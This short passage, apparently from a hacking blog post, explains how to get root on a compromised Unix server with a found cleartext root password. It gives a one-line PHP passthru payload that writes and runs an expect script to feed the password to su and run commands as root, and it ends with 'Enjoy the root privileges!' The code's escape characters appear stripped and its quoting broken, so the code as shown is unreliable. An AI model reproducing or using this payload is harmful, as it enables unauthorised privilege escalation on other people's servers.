</head><body>On this occasion, i was lucky and i spotted a file which had a clear text root password in it. However, getting root wasnt very easy, as i could not figure out an easy way to provide this root password within the php script. In the end after searching for quite a bit, i found a way to do this in expect with the following 1 line of php script:<br/>
<br/>
&lt;?php passthru('echo -e '#!/usr/bin/expect -fnset password [lrange $argv 0 0]; set cmd [lrange $argv 1 1];set timeout -1; spawn su -c "$cmd" ;match_max 100000 ;expect "*?assword:*"; send -- "$passwordr"; send -- "r"; expect eof'&gt;/tmp/su.exp&amp;/usr/bin/expect /tmp/su.exp passw0rd whoami&gt;&gt;/tmp/out.txt');?&gt;<br/>
<br/>
This script will do the following:<br/>
1. create an expect script(/tmp/su.exp) which will take the root (su) password and command to execute as argument.<br/>
2. run the expect script with the root password and command to run as root.<br/>
<br/>
Enjoy the root privileges!<br/>
P.S: it is quite common to see expect installed on *nix application servers</body></html>
